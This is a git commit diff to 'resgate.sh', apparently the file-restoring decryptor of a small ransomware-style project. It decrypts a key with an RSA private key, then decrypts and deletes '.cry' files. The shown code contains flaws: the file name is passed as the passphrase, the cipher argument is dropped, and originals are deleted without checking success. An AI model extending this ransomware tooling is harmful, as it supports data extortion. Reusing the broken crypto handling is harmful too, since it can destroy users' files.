998ae726e4ecbc5da95a58dc5faee1c0a0cd36f0
Rafael Vergani <35334365+vergani@users.noreply.github.com>
2022-11-22 12:39:42 -0300

    Update resgate.sh

--- resgate.sh
+++ resgate.sh
@@ -4,15 +4,26 @@
 # https://github.com/vergani 	#
 #################################
 
+if [[ -f resgate.pem && -f chave.enc ]];
+then
+	echo "[+] Restaurando chave de resgate."
+	openssl rsautl -in chave.enc -out chave.key -decrypt -inkey resgate.pem
+else
+	echo "[-] Necessita arquivos de resgate."
+	exit 0
+fi
 
-openssl rsautl -in chave.enc -out chave.key -decrypt -inkey resgate.pem
 
-arquivos=$(ls *.cry)
 
-# coment
+arquivos=$(ls *.cry 2>/dev/null)
+
+echo "[+] Desfazendo criptografia."
+
 for file in $arquivos
 do
 	novo_nome=$(basename $file .cry)
-	openssl enc -in $file -out $novo_nome  -d -aes256 -k chave.key
+	openssl enc -in $file -out $novo_nome -d -md sha512 -k chave.key
 	rm $file
 done
+
+echo "[+] Restauração concluída."
